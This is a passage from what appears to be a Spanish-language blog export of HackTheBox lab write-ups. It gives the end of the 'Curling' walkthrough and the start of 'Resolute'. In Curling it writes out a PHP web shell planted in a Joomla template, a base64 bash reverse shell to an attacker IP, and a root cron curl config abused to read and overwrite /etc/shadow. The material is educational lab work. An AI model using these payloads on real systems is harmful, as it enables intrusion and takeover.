secondsTenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 6p1       80   HTTP   Apache httpd 2. 4. 29   Lo √∫nico llamativo es Joomla, que es un gestor de contenido web. Sigamos profundizando a ver que encontramos. ‚Ä¶ Enumeraci√≥n #‚Ä¶ Puerto 80 üìå: De primeras vemos 4 cosas interesantes:  El t√≠tulo hace referencia a dos herramientas: cewl (para extraer el texto de una p√°gina web y convertirlo en un objeto de palabras (como un diccionario)) y curl (para realizar peticiones web desde una consola).  Estamos ante el CMS (gestor de contenido) Joomla.  Y hay un login panel. üåà Joomla como dijimos es un gestor de contenido que permite crear sitios web intuitivos, din√°micos e interactivos. Contiene as√≠ mismo un -panel administrativo- el cual sirve para modificar toooooodo el contenido que contenga la web. Si revisamos la interfaz web vemos mucho texto, esto junto a la referencia de cewl nos podr√≠a indicar que debemos crear un diccionario de toooooooodas las palabras e intentar hacer un ataque de fuerza bruta contra el login. Pero claro, nos faltar√≠a saber el usuario con el que probar cada palabra‚Ä¶ Leyendo por encima los anuncios nos damos cuenta de que hay dos referencias a posibles usuarios e incluso una cadena que podr√≠a ser una contrase√±a: Bien, ya tendr√≠amos 3 usuarios con los cuales podr√≠amos probar cada palabra de la web:  Super User o SuperUser o superuser y distintas variantes.  Floris o floris y variaciones.  pebble o Pebble, etc. Antes de eso veamos si existe alg√∫n recurso que el servidor est√© sirviendo, pero que no veamos a simple vista: ‚ù± dirsearch. py -w /opt/SecLists/Discovery/Web-Content/common. txt -u http://10. 10. 10. 150/. . . Target: http://10. 10. 10. 150/[25:25:25] Starting: [25:25:25] 301 - 320B - /administrator -&gt; http://10. 10. 10. 150/administrator/[25:25:25] 301 - 310B - /bin -&gt; http://10. 10. 10. 150/bin/[25:25:25] 301 - 312B - /cache -&gt; http://10. 10. 10. 150/cache/[25:25:25] 301 - 317B - /components -&gt; http://10. 10. 10. 150/components/[25:25:25] 301 - 313B - /images -&gt; http://10. 10. 10. 150/images/[25:25:25] 301 - 315B - /includes -&gt; http://10. 10. 10. 150/includes/[25:25:25] 200 -  14KB - /index. php[25:25:25] 301 - 315B - /language -&gt; http://10. 10. 10. 150/language/[25:25:25] 301 - 314B - /layouts -&gt; http://10. 10. 10. 150/layouts/[25:25:25] 301 - 316B - /libraries -&gt; http://10. 10. 10. 150/libraries/[25:25:25] 301 - 312B - /media -&gt; http://10. 10. 10. 150/media/[25:25:25] 301 - 314B - /modules -&gt; http://10. 10. 10. 150/modules/[25:25:25] 301 - 314B - /plugins -&gt; http://10. 10. 10. 150/plugins/[25:25:25] 403 - 300B - /server-status[25:25:25] 301 - 316B - /templates -&gt; http://10. 10. 10. 150/templates/[25:25:25] 301 - 310B - /tmp -&gt; http://10. 10. 10. 150/tmp/Vemos varios recursos y la mayor√≠a son redirects, pero redireccionan al mismo recurso‚Ä¶ Todos son objetos que usa Joomla en su ejecuci√≥n y funcionamiento, pero hay dos llamativos administrator y tmp. Revisando cada uno, simplemente administrator nos devuelve algo: Recuerdan que en la definici√≥n de Joomla dijimos que existe un *panel administrativo el cual sirve para modificar tooooooodo lo relacionado con el sitio web, pues es este (: Pero de nuevo estamos F, no hay credenciales para probar (adem√°s de las default, pero que no funcionan). Ya con nada m√°s a enumerar, ten√≠a puesto en mi mente el crear el script para jugar (pero no sab√≠a que me faltaba algo que siempre hago y que esta vez se me olvido (¬øya saben que puede ser?), genere la estructura del script, empece a armar las funciones y las dem√°s cositas. Llego el momento de ver si exist√≠an tokens o variables locas que viajaban entre el formulario, con lo cual era necesario ver la estructura (HTML) de la web. En este caso lo que veremos ahora lo encontr√© al ejecutar un script en Python y viendo la respuesta de una petici√≥n web con el m√©todo GET hacia el home (index. php), pero tambi√©n se puede ver simplemente inspeccionando el c√≥digo fuente HTML. . . . import requestsURL =  http://10. 10. 10. 150 r = requests. get(URL)print(r. text). . . En su ejecuci√≥n la respuesta (r. text) nos muestra algo curioso al final: VAYA VAYAAAAAAAAAAAaa lo que vemoooooooooooooos, hay un comentario que dice secret. txt, o sea referencia un archivo . txt, si intentamos buscarlo como recurso de la web, l o e n c o n t r a m o s: Una cadena extra√±a, pero tiene tintes de estar encodeada en base64, valid√©moslo intentando decodificarla: ‚ù± echo  Q3VybGluZzIwMTgh  | base64 -dCurling2018!OIEEEEEEEEEEEEEEeeeEeeee, eso s√≠ que parece una contrase√±a eh! Bastante feo, raro y mehh que este ese recurso ah√≠ en la web como si nada y con un comentario en el home referenci√°ndola, pero bueno, sigamos‚Ä¶ Ya tenemos dos cadenas que parecen contrase√±as:  curling2018.  Curling2018!. Y tenemos los usuarios de antes, pues en vez de jugar con diccionarios probemos r√°pidamente cada usuario ‚Äúpotencial‚Äù con las dos contrase√±as: #!/usr/bin/python3import requestsimport signalimport re# Variables -----------------------. URL =  http://10. 10. 10. 150/administrator/index. php # Funciones -----------------------. def def_handler(sig, frame): # Ctrl+C  print( \nsaLi3ndoo. . \n )  exit(0)signal. signal(signal. SIGINT, def_handler)def login(username, password): # tryLogin  # Generamos una nueva sesi√≥n para cada intento  session = requests. Session()  # Extraemos tokens de sesi√≥n  r = session. get(URL)  hidden_return_value = re. findall(r'&lt;input type= hidden  name= return  value= (. *?) ', r. text)[0]  hidden_csrf_token_value = re. findall(r'&lt;script type= application/json  class= joomla-script-options new &gt;{ csrf. token : (. *?) ', r. text)[0]  data_post = {     username : username,     passwd : password,     option :  com_login ,     task :  login ,     return : hidden_return_value,    hidden_csrf_token_value:  1   }  r = session. post(URL, data=data_post)  if  Username and password do not match or you do not have an account yet  not in r. text:    print(f Credenciales v√°lidas: {username}:{password} )    exit(0)def main(): # elCentrico  array_users = [ Super User ,  Floris ,  plebbe ]  array_passwords = [ curling2018 ,  Curling2018! ]  for username in array_users:    for password in array_passwords:      # Enviamos el usuario con algunas variantes, como MAYUSCULAS, minusculas, quitando espacios, etc.       login(username. lower(), password)      login(username. upper(), password)      login(username. replace(' ',''), password)      login(username. replace(' ',''). lower(), password)      login(username. replace(' ',''). upper(), password)  print( Ninguna credencial es v√°lida. . .  )# Inicio del programa -------------. if __name__ == '__main__':  main()Si lo ejecutamos, tenemoooooooooooooooooooooooos: OPAAAAAAAAAAAAAAAAAAAAAAA, pues valid√©moslas en la web: Y SIII, tamos dentro (: ‚Ä¶ Explotaci√≥n #üî• Si ya sabes como conseguir RCE modificando el template en Joomla puedes evitar mi explicaci√≥n e ir directamente a como obtuvimos la Reverse Shell. Ya dentro el conseguir una ejecuci√≥n remota de comandos es muy sencillo, sigamos un post que me gusta mucho:  Joomla Reverse Shell. Lo √∫nico que debemos hacer es modificar el contenido de un template, existen varios objetos, modificamos uno de ellos con nuestro c√≥digo PHP y ya la web lo interpretar√≠a (: Por ejemplo hagamos que la web ejecute el comando whoami y que nos lo muestre: Modificamos template para conseguir RCE üìå: Debemos seguir esta ruta de clics, primero extensions: Despu√©s templates: Vemos algo as√≠: Damos clic en donde indica la flecha y llegamos a este apartado: Seleccionamos cualquiera de los dos templates, yo usar√© Beez3, damos clic en su nombre y ver√≠amos esto: Yo modificar√© el archivo error. php, damos clic sobre √©l y empezamos a jugar‚Ä¶ El contenido original no nos interesa, lo borramos (o guardamos en alg√∫n lado para despu√©s volverlo dejar como si no hubi√©ramos modificado nada ü§≠) y retomamos la idea de ejecutar whoami, el archivo quedar√≠a as√≠: &lt;?php system( whoami ); ?&gt;  Manual PHP - system(). Lo siguiente ser√° guardar el nuevo contenido del archivo error. php, damos Save y ver√≠amos este mensaje: Perfecto, ahora solo debemos ver el contenido interpretado, siguiendo esta ruta llegamos al objeto error. php: http://10. 10. 10. 150/templates/beez3/error. phpYyyyy en la web ver√≠amos: OJOOOOOOOOOOOOOOOOOOOOOO, vemos que no hay errores y por el contrario se nos interpreta el contenido, nos indica que el usuario que ejecuta el servicio Joomla es www-data. AS√ç QUEEEEEE TEEEENEEEEEMOOOOOS ejecuci√≥n remota de comandos sobre el sistema (: Entabl√©monos una reverse Shell‚Ä¶ Podemos indic√°rselo en el mismo sy, pero A M√ç me gusta guardar una variable desde el m√©todo GET que su contenido sea el que interprete la funci√≥n system(), as√≠ no tenemos que estar modificando el contenido del template y solo jugamos con la variable xmd, veamos un ejemplo r√°pido. Esta ser√≠a la estructura del archivo error. php`: &lt;?php system($_GET['xmd']); ?&gt;Donde la petici√≥n recibir√° una variable llamada xmd que contendr√° nuestro comando y ese comando ser√≠a ejecutado por la funci√≥n system(). Guardamos y validamos el archivo en la web, ahora ejecutemos hostname: http://10. 10. 10. 150/templates/beez3/error. php?xmd=hostnameYyyyy: LISTOOOONES, ahora si hagamos una reverse Shell (: Obtenemos Shell en el sistema como www-data üìå: Nos ponemos en escucha: ‚ù± nc -lvp 4433Generamos nuestro payload (lo que ejecutara el sistema) y lo encodeamos en base64: ‚ù± echo  bash -i &gt;&amp; /dev/tcp/10. 10. 14. 5/4433 0&gt;&amp;1  | base64YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MzMgMD4mMQo=Una vez la petici√≥n sea recibida en nuestro puerto 4433 se generar√° una /bin/bash. Ahora URLencodeamos para evitar que + o = sean interpretados de manera err√≥nea por la web, usaremos esta web: Y lo que haremos para que el sistema entienda lo que le enviamos y lo interprete ser√°: http://10. 10. 10. 150/templates/beez3/error. php?xmd=echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MzMgMD4mMQo%3D | base64 -d | bashLanzamos la petici√≥n y en nuestro listeneeeeeeeeeeeeeer: TAMO DENTROOROROWOWOWOWOWOWOOWOW!! ‚Ä¶ He creado un script para automatizar la modificaci√≥n del template y obtener ejecuci√≥n remota de comandos desde √©l, se los dejo por si algo (con √©l no es necesario URLencodear nada): üî¢ joomlArce. py ‚Ä¶ Antes de seguir hagamos un tratamiento de la TTY, esto para que nuestra Shell sea completamente interactiva, nos permita ejecutar Ctrl+C, tener hist√≥rico de comandos y movernos entre ellos.  https://lanzt. gitbook. io/cheatsheet-pentest/tty. Ahora si sigamos‚Ä¶ ‚Ä¶ backup_password: www-data -&gt; floris #Enumerando los directorios desde que obtenemos la reverse Shell hacia atr√°s vemos uno llamativo ¬ølo ves?: Un objeto con nombre configuration. php nos dice ‚Äúinvest√≠game‚Äù, as√≠ que hag√°mosle caso: (Es muy grande üòè) Entre todo lo que hay detallamos dos contrase√±as, $password y $secret. Una de ellas es para el servicio MySQL y el usuario floris, si las probamos si nos permiten entrar al servicio MySQL, pero no encontramos nada √∫til en √©l :( e intentando reutilizaci√≥n de contrase√±as tampoco obtenemos nada‚Ä¶ Enumerando el sistema, encontramos un dos archivos llamativos en el /home de floris:  El directorio admin-area, pero no tenemos acceso a √©l a√∫n.  Por el contrario si tenemos acceso al objeto password_backup. Descomprimiendo el comprimido del comprimido üìå: Veamos el backup‚Ä¶ El resultado de un dumpeo hexadecimal contra un objeto, pero ¬øc√≥mo sabemos que es de un objeto?, bueno, investigando existe una herramienta con la que podemos (entre muuuchas cosas) -revertir- ese contenido hexadecimal al original.  xxd - Unix, Linux Command Pues intent√©moslo y guardemos el resultado en un archivo: www-data@curling:/home/floris$ xxd -r password_backup &gt; /tmp/file_reverseY si validamos el archivo resultante vemos el tipo de archivo original: www-data@curling:/tmp$ file file_reverse file_reverse: bzip2 compressed data, block size = 900kUn comprimido bzip2, pues d√©mosle el nombre de archivo necesario e intentemos descomprimirlo: (Al ser poquitas veces las que debemos descomprimir el archivo, aprovecho para mostrarles el paso a paso) www-data@curling:/tmp$ mv file_reverse file_reverse. bz2www-data@curling:/tmp$ bzip2 -d file_reverse. bz2Y como resultado tenemos un nuevo objeto: www-data@curling:/tmp$ file file_reverse file_reverse: gzip compressed data, was  password , last modified: Tue May 22 19:16:20 2018, from UnixAhora tenemos un objeto comprimido con gzip, descomprim√°moslo: www-data@curling:/tmp$ mv file_reverse file_reverse. gzwww-data@curling:/tmp$ gzip -d file_reverse. gzY obtenemos un nuevo bzip2: www-data@curling:/tmp$ file file_reverse file_reverse: bzip2 compressed data, block size = 900kVolvemos a descomprimirlo: www-data@curling:/tmp$ mv file_reverse file_reverse. bz2 www-data@curling:/tmp$ bzip2 -d file_reverse. bz2Y como resultado ahora obtenemos: www-data@curling:/tmp$ file file_reverse file_reverse: POSIX tar archive (GNU)Un objeto tar, descomprim√°moslo: www-data@curling:/tmp$ mv file_reverse file_reverse. tar. gzwww-data@curling:/tmp$ tar -xvf file_reverse. tar. gz password. txtNos devuelve el objeto password. txt y ese si parece ser un archivo de texto, validemos: www-data@curling:/tmp$ file password. txt password. txt: ASCII textPos si, si vemos su contenido encontramos una cadena que si tiene toda la pinta de ser una credencial: Pues si la validamos ya sea con su floris o ejecutando en otra terminal ssh floris@10. 10. 10. 150, vamos a obtener lo mismo, una sesi√≥n en el sistema como floris: ‚ù± ssh floris@10. 10. 10. 150 PEEEERRRFECCCTOOOO!! ‚Ä¶ Cree un script en bash que va a moverse entre toooooodos los archivos modificando sus nombres y efectuando la dezcomprimhisazion: üî¢ brutopress. sh ‚Ä¶ Escalada de privilegios #Si recordamos hab√≠a una carpeta bastante llamativa en el /home de floris: floris@curling:~$ lsadmin-area password_backup user. txtVeamos que hay en ella: Jmmmm, si nos fijamos son archivos actuales y que tienen la misma hora-fecha de creaci√≥n/modificaci√≥n, YYYYY al estar en el grupo floris tenemos acceso a modificarlos y leerlos, curioso, bastante curioso‚Ä¶ Revisando el contenido de cada uno tenemos: floris@curling:~/admin-area$ cat input url =  http://127. 0. 0. 1 floris@curling:~/admin-area$ cat report&lt;!DOCTYPE html&gt;&lt;html lang= en-gb  dir= ltr &gt;&lt;head&gt;    &lt;meta name= viewport  content= width=device-width, initial-scale=1. 0  /&gt;    &lt;meta charset= utf-8  /&gt;    &lt;base href= http://127. 0. 0. 1/  /&gt;    &lt;meta name= description  content= best curling site on the planet!  /&gt;    &lt;meta name= generator  content= Joomla! - Open Source Content Management  /&gt;    &lt;title&gt;Home&lt;/title&gt;    . . . . . . El objeto report tiene el mismo c√≥digo HTML que si hacemos una petici√≥n hacia el recurso http://10. 10. 10. 150, con lo cual sabemos que internamente tambi√©n esta siendo ejecutado el CMS Joomla‚Ä¶ Sin entender muy bien que hacer me puse a enumerar que instrucciones o acciones est√°n siendo ejecutadas de manera -automatizada- en el sistema. Existen varios m√©todos, pero hay una herramienta llamada pspy que hace un recorrido por el sistema buscando tareas que se est√©n ejecutando. Descargamos el binario de ac√° y lo subimos a la m√°quina: # Creamos entorno de trabajofloris@curling:/tmp$ mkdir miacosafloris@curling:/tmp$ cd miacosa/floris@curling:/tmp/miacosa$ curl http://10. 10. 14. 5:8000/pspy -o pspyfloris@curling:/tmp/miacosa$ file pspy pspy: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, strippedListo, ahora lo ejecutamos: floris@curling:/tmp/miacosa$ chmod +x pspyfloris@curling:/tmp/miacosa$ . /pspy OPAAAAAAAAAa, existen dos instrucciones siendo ejecutadas por el usuario root (por el UID (user id), root siempre tiene asignado 0), pero solo una nos llama la atenci√≥n, ya que esta interactuando con los archivos input y report, los dos objetos que encontramos antes y que ten√≠an fecha-hora igual. ¬°Ah√≠ esta la raz√≥n de eso!! Es ejecutada cada minuto: La instrucci√≥n es sencilla: /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportEl par√°metro -K toma un archivo de configuraci√≥n, en su contenido van instrucciones que cURL interpretara, por ejemplo podemos pasarle user-agent, url, output, -L (para ver redirecciones), etc. Todos los argumentos con los que ejecutamos cURL desde la terminal los podemos agregar en un archivo y pas√°rselo con el par√°metro -K: ‚öôÔ∏è -K, --config &lt;file&gt;  Specify a text file to read curl arguments from. The command line arguments found in the text file will be used as if they were provided on the command line. Como el √∫nico argumento actual en input es: url =  http://127. 0. 0. 1 Esta haciendo una petici√≥n hacia esa URL (: Y simplemente el resultado de la consulta la guarda en report (con -o). Sencillito de entender. Ahora veamos como romper esoooooooooooooooooooowoweoriwqeru‚Ä¶ ‚Ä¶ Jugando con el archivo que toma cURL como configuraci√≥n üìå: Intentando cositas como pasarle nuestra URL de alg√∫n servidor Python, recibimos la petici√≥n, pero claro, no tenemos posibilidad de indicarle que interprete lo que sea que tengamos sirviendo üòû Buscando y buscando llegamos a este recurso del siempre fiel GTFOBins (√©chenle un ojo, tiene muuuuuuuchas maneras de explotar muuuuuuuuuuchos binarios):  https://gtfobins. github. io/gtfobins/curl/. Nos indica que si queremos leer archivos podemos usar file:// seguido del archivo en cuesti√≥n‚Ä¶ OPA, interesante, puees si la instrucci√≥n cURL la esta ejecutando root podemos ver archivos privilegiados, ¬øno? Puuuuuues intentemos ver el archivo que contiene tooodas las contrase√±as de los usuarios del sistema, el objeto /etc/shadow: Debemos modificar el archivo input con esto: floris@curling:/tmp/miacosa$ echo 'url =  file:///etc/shadow 'url =  file:///etc/shadow Pues hag√°moslo: Y si revisamos el archivo report: ¬°Qu√© maravillaaaaaaaaaaaaaaaaaaaaaaaaaaa!! Con esto ya podr√≠amos obtener la flag de root‚Ä¶ Cambiamos la contrase√±a de root para obtener una Shell en el sistema üìå: Probando maneras de obtener una Shell con simplemente una subida y modificaci√≥n de archivos recorde una manera que interactuaba directamente con el archivo /etc/shadow, en internet encontramos este post con una explicaci√≥n brutal:  Privilege Escalation: Exploiting write access to /etc/shadow. Visiten el post, esta muy bueno y explica muuuchas cosas que no tocar√© ac√°. (En pocas palabras)‚Ä¶ Una credencial del archivo /etc/shadow normalmente tiene este formato: test:x:1002:1002:test,,,:/test:/bin/bashDonde de todos los campos (separados por :) el que contiene la contrase√±a en este ejemplo es x. Pero OJOOOOOOOOO, la contrase√±a no es x (por si no me hice entender) ü§™, donde esta la x va el hash de la contrase√±a‚Ä¶ Entonces, la explotaci√≥n se basa en remplazar el hash (la contrase√±a) de alg√∫n usuario con uno nuevo queeeeee haga referencia a una contrase√±a que conozcamos (obvio :P). Esto para iniciar sesi√≥n con esa nueva contrase√±a contra el usuario al que le cambiamos su hash (contrase√±a). Ve√°moslo en la pr√°ctica. Tomamos el contenido original del archivo /etc/shadow. Aprovechemos el archivo de configuraci√≥n para indicarle que nos guarde el resultado de la petici√≥n en otro archivo: floris@curling:/tmp/miacosa$ echo -e 'url =  file:///etc/shadow \n-o /tmp/miacosa/shasha'url =  file:///etc/shadow -o /tmp/miacosa/shashafloris@curling:/tmp/miacosa$ echo -e 'url =  file:///etc/shadow \n-o /tmp/miacosa/shasha' &gt; /home/floris/admin-area/inputEsperamos un momento y ya tendr√≠amos el archivo shasha en nuestra carpeta de trabajo, (de todas las formas en que podemos pasarnos el archivo) tomamos su contenido, nos lo llevamos a nuestra m√°quina y generamos un nuevo archivo con √©l: Y ahora nos queda identificar que tipo de hash tiene el usuario root para as√≠ mismo generar el nuestro con el formato correcto: root:$6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c. bljjnn6FMF1:17673:0:99999:7:::. . . En el mismo post nos indica: As√≠ que el algoritmo usado es SHA-512, encontramos estas maneras de generarlos desde consola:  How to create SHA512/SHA256/MD5 password hashes on command line.  How to create SHA512 password hashes on command line. Nos quedaremos con esta manera: ‚ù± python3 -c 'import crypt; print(crypt. crypt( hola , crypt. mksalt(crypt. METHOD_SHA512)))'Donde hola es la ‚Äúcontrase√±a‚Äù que queremos encriptar, pues generemos el hash para ajatepille: ‚ù± python3 -c 'import crypt; print(crypt. crypt( ajatepille , crypt. mksalt(crypt. METHOD_SHA512)))'$6$4iWM54cNAlfhQmjI$ZXyO9QTKqY0iXUwcliHzZ. o8LjNyj. l9ZS6iw0gv7hj1vuUp2LwBykBkE2GFjsvggl2CA4HQInUCVYap6WznA0Perfect√≠simo, lo siguiente ser√° remplazar la contrase√±a de root por la nueva: root:$6$4iWM54cNAlfhQmjI$ZXyO9QTKqY0iXUwcliHzZ. o8LjNyj. l9ZS6iw0gv7hj1vuUp2LwBykBkE2GFjsvggl2CA4HQInUCVYap6WznA0:17673:0:99999:7:::. . . Y como paso final debemos indicarle a la instrucci√≥n cURL que tome ese contenido y lo remplac√© por el actual: (Levantamos un servidor web en la ruta donde est√© el archivo shadow) ‚ù± python3 -m http. serverY en el objeto input indicamos: floris@curling:/tmp/miacosa$ echo -e 'url =  http://10. 10. 14. 5:8000/shadow \n-o /etc/shadow'url =  http://10. 10. 14. 5:8000/shadow -o /etc/shadowfloris@curling:/tmp/miacosa$ echo -e 'url =  http://10. 10. 14. 5:8000/shadow \n-o /etc/shadow' &gt; /home/floris/admin-area/input Nos llegara la petici√≥n, leer√° el contenido del archivo hosteado (shadow) y lo guardara en la ruta /etc/shadow, o sea, el nuevo archivo ser√° el que contiene nuestra contrase√±a (: YyyyyyyyyyyyYYYyyyYyyy si ahora intentamos conectarnos como root con la contrase√±a ajatepille: VAMOOOOOOOOOOOOOOONOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOS!! Conseguimos una Shell como el usuario root cambi√°ndole su contrase√±a, que belleza!! Veamos las flags: Y eso es todo por esta m√°quina :(:(:(:(: ‚Ä¶ Bonito camino, lo de encontrar secret. txt as√≠ como as√≠ en un comentario fue muy KLK, pero de resto fue de mucho aprendizaje. Y weno, nos reencontraremos en otra ocasi√≥n, a darle duro a todo yyyyyyyyyyyyyyyyyyy a seguir rompiendoOOO0oOOOOOOoooooTODOOOOOOOOooooOO!! "
    }, {
    "id": 25,
    "url": "http://localhost:4000/htb/resolute",
    "title": "HackTheBox - Resolute",
    "body": "2021/08/14 - M√°quina Windows nivel medio. Enumeraremos hasta m√°s no poder un controlador de dominio, veremos contrase√±as volando libremente e inyectaremos una DLL maliciosa en un servidor DNS üò≤ TL;DR (Spanish writeup): Creada por: egre55. El dinamismo ante todooooooooooo0OoooO! Nos enfrentaremos a un DC (controlador de dominio) to lindo, inicialmente enumeraremos el protocolo LDAP, con √©l conseguiremos bastante info de unos usuarios. Los recopilaremos para usarlos despu√©s. Jugaremos con rpcclient para enumerar el dominio un poco m√°s, encontraremos una contrase√±a en la descripci√≥n del usuario marko, pero valid√°ndolas contra el sistema u otro servicio no ser√°n v√°lidas. Tomaremos los usuarios que obtuvimos antes y probaremos con cada uno esa contrase√±a. Finalmente tendremos como candidato v√°lido el usuario Melanie, jugando con evil-winrm obtendremos una PowerShell en el sistema como ella. En un directorio del sistema encontraremos el log de unos comandos ejecutados en PowerShell (PSTranscript), con los ojos bien grandes veremos unas credenciales usadas por el usuario Ryan para intentar mapear unos directorios del sistema. Usaremos evil-winrm para obtener una nueva Shell. Veremos que Ryan esta en el grupo DnsAdmins, jugaremos con ese grupo para explotar el servidor DNS, inyectaremos una DDL maliciosa que al ser ejecutada nos devuelva una Reverse Shell como el usuario nt authority\system (: ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Mucho real!! Bastante enumerar y manos ensuciar e. e  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ HAY QUE VIVIR TODOS LOS D√çAS!  Reconocimiento.      Enumeraci√≥n de puertos con nmap.     Enumeraci√≥n.      Recorremos el protocolo LDAP.     Explotaci√≥n: encontramos usuarios en el servidor LDAP.      Enumeramos un poquito m√°s del Domain Controller.     Nos movemos de Melanie a Ryan viendo archivos del sistema.  Escalada de privilegios: explotamos el grupo DnsAdmins.  Post-Explotaci√≥n: Compilamos nuestra propia **DLL**.      Generamos la DLL usando dns-exe-persistance.    Generamos la DLL usando DNSAdmin-DLL.    ‚Ä¶ Reconocimiento #‚Ä¶ Enumeraci√≥n de puertos con nmap üìå: Iniciaremos encontrando que puertos tiene activos y expuestos la m√°quina, para esto usaremos nmap: ‚ù± nmap -p- --open -v 10. 10. 10. 169 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   El escaneo nos devuelve varios puertos: ‚ù± cat initScan# Nmap 7. 80 scan initiated Wed Aug 11 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 169# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 169 ()	Status: UpHost: 10. 10. 10. 169 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49670/open/tcp/////, 49676/open/tcp/////, 49677/open/tcp/////, 49688/open/tcp/////, 49712/open/tcp/////# Nmap done at Wed Aug 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 126. 37 seconds      Puerto   Descripci√≥n         53   DNS: Permite a internet identificar que dominio es de que IP y viceversa.        88   Kerberos: Protocolo de autenticaci√≥n.        135/593   RPC: Permite la comunicaci√≥n entre computadores de distintas redes sin problemas.        139/445   SMB: Podemos compartir informaci√≥n entre dispositivos de una red.        389/636/3268/3269   LDAP: Protocolo que ayuda a la localizaci√≥n de ‚Äúrecursos‚Äù en una red.        464   kpasswd5: Relacionado con el protocolo kerberos: Kerberos Password Change.        5985/47001   WinRM: Usado para ejecutar tareas administrativas de una red.        9389   ADWS: Active Directory Administrative Center.        49664/49666   No sabemos.        49667/49670/49676   No sabemos.        49677/49688/49712   Y no sabemos.    Uff, varios puertos‚Ä¶ Ya teniendo conocimiento de los servicios que tiene activos la m√°quina, haremos otro escaneo, pero esta vez para descubrir que versiones y script est√°n relacionados con cada servicio: ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 169  [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49666,49667,49670,49676,49677,49688,49712[*] Ports copied to clipboard)~ ‚ù± nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49666,49667,49670,49676,49677,49688,49712 -sC -sV 10. 10. 10. 169 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Obtenemos: ‚ù± cat portScan# Nmap 7. 80 scan initiated Wed Aug 11 25:25:25 2021 as: nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49666,49667,49670,49676,49677,49688,49712 -sC -sV -oN portScan 10. 10. 10. 169Nmap scan report for 10. 10. 10. 169Host is up (0. 12s latency). PORT   STATE SERVICE   VERSION53/tcp  open domain?| fingerprint-strings: |  DNSVersionBindReqTCP: |   version|_  bind88/tcp  open kerberos-sec Microsoft Windows Kerberos (server time: 2021-08-11 16:45:18Z)135/tcp  open msrpc    Microsoft Windows RPC139/tcp  open netbios-ssn Microsoft Windows netbios-ssn389/tcp  open ldap     Microsoft Windows Active Directory LDAP (Domain: megabank. local, Site: Default-First-Site-Name)445/tcp  open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)464/tcp  open kpasswd5?593/tcp  open ncacn_http  Microsoft Windows RPC over HTTP 1. 0636/tcp  open tcpwrapped3268/tcp open ldap     Microsoft Windows Active Directory LDAP (Domain: megabank. local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found9389/tcp open mc-nmf    . NET Message Framing47001/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found49664/tcp open msrpc    Microsoft Windows RPC49666/tcp open msrpc    Microsoft Windows RPC49667/tcp open msrpc    Microsoft Windows RPC49670/tcp open msrpc    Microsoft Windows RPC49676/tcp open ncacn_http  Microsoft Windows RPC over HTTP 1. 049677/tcp open msrpc    Microsoft Windows RPC49688/tcp open msrpc    Microsoft Windows RPC49712/tcp open msrpc    Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port53-TCP:V=7. 80%I=7%D=8/11%Time=6113FBAF%P=x86_64-pc-linux-gnu%r(DNSVSF:ersionBindReqTCP,20, . . . SF:. . . x03 );Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h32m36s, deviation: 4h02m31s, median: 12m35s| smb-os-discovery: |  OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6. 3)|  Computer name: Resolute|  NetBIOS computer name: RESOLUTE\x00|  Domain name: megabank. local|  Forest name: megabank. local|  FQDN: Resolute. megabank. local|_ System time: 2021-08-11T09:46:12-07:00| smb-security-mode: |  account_used: guest|  authentication_level: user|  challenge_response: supported|_ message_signing: required| smb2-security-mode: |  2. 02: |_  Message signing enabled and required| 